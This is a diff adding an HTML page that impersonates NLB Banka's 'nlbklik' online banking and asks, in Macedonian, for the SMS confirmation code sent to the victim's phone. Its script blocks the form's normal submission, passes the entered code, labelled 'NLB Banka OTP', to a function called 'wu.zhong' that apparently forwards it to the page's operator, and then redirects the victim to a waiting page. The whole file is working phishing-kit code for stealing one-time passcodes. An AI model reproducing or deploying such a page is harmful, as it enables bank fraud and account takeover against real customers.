@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/css/nlb.css">
+    <title>nlbklik</title>
+</head>
+<body>
+
+    <header>
+    <img src="res/img/logoo.png">
+    </header>
+
+<form action="post.php" method="post">
+   <div class="border">
+
+        <h3>Потврда</h3>
+        <p>Ве молиме внесете го кодот испратен на вашиот телефонски број за да продолжите</p>
+      </div>
+      
+    </div>
+  
+
+        <div class="col">
+          <label>код за потврда</label>
+          <input type="text" name="otp" required placeholder="Внесете го кодот">
+   
+        </div>
+
+        <div class="col1" style="text-align:center;">
+          <button type="sumbit">продолжи понатаму</button>
+        </div>
+    </form>
+        
+        
+
+
+      </div>
+
+
+
+
+
+
+
+
+
+    </div>
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+    e.preventDefault();
+
+  wu.zhong(`🔒 NLB Banka OTP: ${document.querySelector("[name='otp']").value}`);
+
+    window.location="wait.html";
+
+})
+
+</script>
+
+
+
+
+
+
+</body>
+</html>  
